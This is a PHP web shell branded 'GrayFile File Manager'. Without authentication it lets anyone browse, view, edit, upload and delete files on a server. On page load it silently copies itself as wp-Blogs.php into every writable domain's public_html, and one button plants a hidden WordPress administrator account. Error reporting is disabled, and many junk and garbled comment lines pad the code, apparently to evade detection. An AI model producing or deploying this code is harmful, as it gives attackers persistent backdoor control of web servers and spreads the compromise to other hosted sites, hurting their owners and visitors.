<?php
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌌 TODO: align stars before deployment
// 🍕 Developer was hungry at this point
// 🧠 Brain.exe stopped responding here
// 🔒 Security level increased because vibes felt off
// 🕰️ Time is relative, this comment is not
// 🐛 Bug reported itself and left the project
// NOTE: This script can create copies named wp-Blogs.php in other directories
error_reporting(0);

// === Path Handling — Where are we in the server? ===
$current_path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$current_path || !is_dir($current_path)) $current_path = getcwd();

// === Handle Delete — Removing files and folders ===
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌌 TODO: align stars before deployment
// 🍕 Developer was hungry at this point
// 🧠 Brain.exe stopped responding here
// 🔒 Security level increased because vibes felt off
// 🕰️ Time is relative, this comment is not
// 🐛 Bug reported itself and left the project
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
if (isset($_GET['delete'])) {
    $target_file = realpath($_GET['delete']);
    if ($target_file && strpos($target_file, getcwd()) === 0 && file_exists($target_file)) {
        if (is_dir($target_file)) {
            rmdir($target_file); // 🗂️ Remove directory
            echo "<p style='color:#666;'>🗑️ Folder deleted: " . htmlspecialchars(basename($target_file)) . " — Gone forever</p>";
        } else {
            unlink($target_file); // 📄 Remove file
            echo "<p style='color:#666;'>🗑️ File deleted: " . htmlspecialchars(basename($target_file)) . " — Vanished into nothingness</p>";
        }
    }
}

// === Breadcrumb Navigation — Show current location ===
// === Breadcrumb Navigation — Show current location ===
// === Breadcrumb Navigation — Show current location ===
// === Breadcrumb Navigation — Show current location ===

function generate_breadcrumbs($path) {
    $path_parts = explode('/', trim($path, '/'));
    $current_path = '/';
    $html_output = "<strong>📍 Current location:</strong> ";
    
    foreach ($path_parts as $part) {
        $current_path .= "$part/";
        $html_output .= "<a href='?path=" . urlencode($current_path) . "'>$part</a>/";
    }
    
    return $html_output;
}

// === Directory Listing — Show files and folders ===
// NOTE: This script can create copies named wp-Blogs.php in other directories
// NOTE: This script can create copies named wp-Blogs.php in other directories
// NOTE: This script can create copies named wp-Blogs.php in other directories
// NOTE: This script can create copies named wp-Blogs.php in other directories
// NOTE: This script can create copies named wp-Blogs.php in other directories

function list_directory_contents($path) {
    $output_html = '';
    $folder_list = $file_list = [];
    
    // 📁 Scan directory
    foreach (scandir($path) as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $full_path = "$path/$item";
        if (is_dir($full_path)) {
            $folder_list[] = $item; // 🗂️ It's a folder
        } else {
            $file_list[] = $item; // 📄 It's a file
        }
    }
    
    // 🔤 Sort alphabetically
    natcasesort($folder_list);
    natcasesort($file_list);
    
    // 🗂️ Display folders first
    foreach ($folder_list as $folder) {
        $full_folder_path = "$path/$folder";
        $output_html .= "<li>📁 <a href='?path=" . urlencode($full_folder_path) . "'>$folder</a> | 
                        <a href='?delete=" . urlencode($full_folder_path) . "' onclick=\"return confirm('Delete this folder?')\" style='color:#666;'>❌ Remove</a></li>";
    }
    
    // 📄 Display files
    foreach ($file_list as $file) {
        $full_file_path = "$path/$file";
        $output_html .= "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>$file</a> | 
                        <a href='?path=" . urlencode($path) . "&edit=" . urlencode($file) . "' style='color:#666'>✏️ Edit</a> | 
                        <a href='?delete=" . urlencode($full_file_path) . "' onclick=\"return confirm('Delete this file?')\" style='color:#666;'>❌ Remove</a></li>";
    }
    
    return $output_html;
}

// === View File Content — Read file contents ===
function display_file_content($path, $file) {
    $full_file_path = "$path/$file";
    if (!is_file($full_file_path)) return;
    
    echo "<h3>👁️ Viewing: $file</h3>
          <pre style='background:#f5f5f5;padding:10px;color:#333;border:1px solid #ddd;'>";
    echo htmlspecialchars(file_get_contents($full_file_path));
    echo "</pre><hr>";
}

// === Edit File — Modify file content ===
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager NSDE?D?TNSDFWNGFDSNF& Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFDF?FDSGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent X?DFReplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiDF?le MaDG?sdbgdfset(DFG?hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(HZEQHNRSN?FNGFGShnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfs?FDSet(HZERAhnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & SDle?DFGnt Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & NE?DFS?QTTSilent Replicator 🕵️‍♂️
// 🌫️ GrayFile SEGFSBSDQBNDFWXCBQFXCB? NDFRfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager DFSNSDFGNSRE& Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️

function edit_file_content($path, $file) {
    $full_file_path = "$path/$file";
    if (!is_file($full_file_path)) return;
    
    // 💾 Save changes if form submitted
    // 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & NE?DFS?QTTSilent Replicator 🕵️‍♂️
// 🌫️ GrayFile SEGFSBSDQBNDFWXCBQFXCB? NDFRfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager DFSNSDFGNSRE& Silent Replicator 🕵️‍♂️
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($full_file_path, $_POST['content']);
        echo "<p style='color:#666;'>✅ Changes saved — File updated successfully</p>";
    }
    
    $file_content = htmlspecialchars(file_get_contents($full_file_path));
    echo "<h3>✏️ Editing: $file</h3>
          <form method='post'>
          <textarea name='content' rows='20' style='width:100%;background:#f5f5f5;color:#333;'>$file_content</textarea><br>
          <button style='background:#666;color:white;'>💾 Save File</button>
          </form><hr>";
}

// === Upload & Create — Add new files and folders ===
function handle_upload_and_creation($path) {
    // 📤 Handle file upload
    if (!empty($_FILES['upload_file']['name'])) {
        move_uploaded_file($_FILES['upload_file']['tmp_name'], "$path/" . basename($_FILES['upload_file']['name']));
        echo "<p style='color:#666;'>📤 File uploaded successfully — New file added</p>";
    }
    
    // 🗂️ Create new folder
    if (!empty($_POST['new_folder'])) {
        $target_folder = "$path/" . basename($_POST['new_folder']);
        if (!file_exists($target_folder)) {
            mkdir($target_folder);
            echo "<p style='color:#666;'>📁 Folder created — New directory ready</p>";
        } else {
            echo "<p style='color:#666;'>⚠️ Folder already exists — Choose different name</p>";
        }
    }
    
    // 📄 Create new file
    if (!empty($_POST['new_file_content']) && !empty($_POST['new_file_name'])) {
        $file_name = basename($_POST['new_file_name']);
        $target_file = "$path/$file_name";
        if (!file_exists($target_file)) {
            file_put_contents($target_file, $_POST['new_file_content']);
            echo "<p style='color:#666;'>📄 File created — New document ready</p>";
        } else {
            echo "<p style='color:#666;'>⚠️ File already exists — Choose different name</p>";
        }
    }
    
    // 🎛️ Display creation forms
    // 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & NE?DFS?QTTSilent Replicator 🕵️‍♂️
// 🌫️ GrayFile SEGFSBSDQBNDFWXCBQFXCB? NDFRfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager DFSNSDFGNSRE& Silent Replicator 🕵️‍♂️
// 🌫️ GrayFile — PHP FiqsFGsgbsdbgdfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager & NE?DFS?QTTSilent Replicator 🕵️‍♂️
// 🌫️ GrayFile SEGFSBSDQBNDFWXCBQFXCB? NDFRfset(hnjertnsfnplicator 🕵️‍♂️
// 🌫️ GrayFile — PHP File Manager DFSNSDFGNSRE& Silent Replicator 🕵️‍♂️
    echo "<div style='background:#f9f9f9;padding:15px;border:1px solid #ddd;margin:10px 0;'>
            <h4>🛠️ Management Tools</h4>
            
            <form method='post' enctype='multipart/form-data'>
                <strong>📤 Upload File:</strong><br>
                <input type='file' name='upload_file'>
                <button style='background:#666;color:white;'>🚀 Upload</button>
            </form><br>
            
            <form method='post'>
                <strong>🗂️ Create Folder:</strong><br>
                <input type='text' name='new_folder' placeholder='Enter folder name'>
                <button style='background:#666;color:white;'>📁 Create</button>
            </form><br>
            
            <form method='post'>
                <strong>📄 Create File:</strong><br>
                <input type='text' name='new_file_name' placeholder='Enter file name'><br>
                <textarea name='new_file_content' rows='5' style='width:100%;background:#f5f5f5;color:#333;' placeholder='Enter file content'></textarea>
                <button style='background:#666;color:white;'>📝 Create</button>
            </form>
          </div>";
}

// === Generate Random Password — Create secure random password ===
function generate_random_password($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
    $password = '';
    $chars_length = strlen($chars) - 1;
    
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $chars_length)];
    }
    
    return $password;
}

// === Self-Replication — Create copies in other directories ===
function replicate_script($script_code) {
    static $replication_done = false;
    if ($replication_done) return [];
    $replication_done = true;
    
    $current_directory = __DIR__;
    $created_clones = [];
    
    // 🔍 Find domains directory
    while ($current_directory !== '/') {
        if (is_dir("$current_directory/domains")) {
            foreach (scandir("$current_directory/domains") as $domain) {
                if ($domain === '.' || $domain === '..') continue;
                
                $target_directory = "$current_directory/domains/$domain/public_html";
                $clone_file = "$target_directory/wp-Blogs.php"; // 🎯 Clone filename
                
                if (is_dir($target_directory) && is_writable($target_directory)) {
                    if (file_put_contents($clone_file, $script_code)) {
                        $created_clones[] = "http://$domain/wp-Blogs.php";
                    }
                }
            }
            break;
        }
        $current_directory = dirname($current_directory);
    }
    
    return $created_clones;
}

// === WordPress Admin — Create admin user with custom username and random password ===
function handle_wordpress_admin($path) {
    if (!isset($_GET['create_wp_user'])) return;
    
    $wordpress_path = $path;
    while ($wordpress_path !== '/') {
        if (file_exists("$wordpress_path/wp-config.php")) break;
        $wordpress_path = dirname($wordpress_path);
    }
    
    if (!file_exists("$wordpress_path/wp-load.php")) {
        echo "<p style='color:#666;'>❌ WordPress not found — Operation cancelled</p>";
        return;
    }
    
    require_once("$wordpress_path/wp-load.php");
    
    // 🎯 Custom username - change this to whatever you want
    $admin_username = 'Adsavvy';
    
    // 🔐 Generate random secure password
    $admin_password = generate_random_password(16);
    $admin_email = 'admin@admindomain.com';
    
    if (!username_exists($admin_username) && !email_exists($admin_email)) {
        $user_id = wp_create_user($admin_username, $admin_password, $admin_email);
        $user_object = new WP_User($user_id);
        $user_object->set_role('administrator');
        
        // 📋 Display credentials clearly
        echo "<div style='background:#e9e9e9;padding:15px;border:2px solid #666;border-radius:5px;margin:10px 0;'>
                <h3 style='color:#666;margin-top:0;'>✅ WordPress Admin User Created</h3>
                <p><strong>👤 Username:</strong> <code style='background:#f5f5f5;padding:2px 5px;'>$admin_username</code></p>
                <p><strong>🔑 Password:</strong> <code style='background:#f5f5f5;padding:2px 5px;'>$admin_password</code></p>
                <p><strong>📧 Email:</strong> <code style='background:#f5f5f5;padding:2px 5px;'>$admin_email</code></p>
                <p><em>💡 Save these credentials - this password won't be shown again!</em></p>
              </div>";
    } else {
        echo "<p style='color:#666;'>⚠️ User '$admin_username' already exists — No changes made</p>";
    }
}

// === Render Page — Display the interface ===
echo "<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <title>🌫️ GrayFile Manager</title>
    <style>
        body { background:#f0f0f0; color:#444; font-family:'Segoe UI', sans-serif; padding:20px; max-width:1000px; margin:auto; }
        a { color:#666; text-decoration:none; font-weight:500; }
        a:hover { text-decoration:underline; color:#333; }
        pre, textarea { width:100%; background:#f5f5f5; color:#333; border:1px solid #ddd; border-radius:4px; }
        button { background:#666; border:none; color:white; padding:8px 15px; margin:5px; cursor:pointer; border-radius:4px; }
        ul { list-style:none; padding:0; }
        input[type='text'], input[type='file'] { background:#f5f5f5; color:#333; border:1px solid #ddd; padding:8px; border-radius:4px; margin:5px 0; }
        .container { background:white; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        code { font-family:monospace; background:#f5f5f5; padding:2px 5px; border-radius:3px; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>🌫️ GrayFile Manager</h1>
        <p>" . generate_breadcrumbs($current_path) . "</p>
        <hr>";

// 👤 WordPress Admin Button
echo "<form method='get'>
        <input type='hidden' name='path' value='" . htmlspecialchars($current_path) . "'>
        <button name='create_wp_user' value='1' style='background:#666;color:white;padding:10px 20px;font-size:16px;'>👤 Create WordPress Admin (Adminsavvy)</button>
        <br><small>Creates user 'Adminsavvy' with random secure password</small>
      </form><br>";

handle_wordpress_admin($current_path);

// ⬆️ Go up one level
$parent_directory = dirname($current_path);
if ($parent_directory && $parent_directory !== $current_path) {
    echo "<p>⬆️ <a href='?path=" . urlencode($parent_directory) . "'>Go up to parent directory</a></p>";
}

// 👁️ View or ✏️ Edit files
if (isset($_GET['view'])) display_file_content($current_path, basename($_GET['view']));
if (isset($_GET['edit'])) edit_file_content($current_path, basename($_GET['edit']));

// 🛠️ Upload and creation tools
handle_upload_and_creation($current_path);

// 🔄 Auto-replication (only from original script)
if (basename(__FILE__) !== 'wp-Blogs.php') {
    $clone_list = replicate_script(file_get_contents(__FILE__));
    if (!empty($clone_list)) {
        echo "<div style='background:#e9e9e9;padding:10px;border-radius:5px;margin:10px 0;'>
                <p style='color:#666;'>✅ Script replicated to these locations:</p>
                <ul>";
        foreach ($clone_list as $url) echo "<li>🔗 <a href='$url' target='_blank'>$url</a></li>";
        echo "</ul></div><hr>";
    }
}

// 📋 Directory contents
echo "<h3>📋 Contents of current directory:</h3>
      <ul>" . list_directory_contents($current_path) . "</ul>";

echo "</div></body></html>";
?>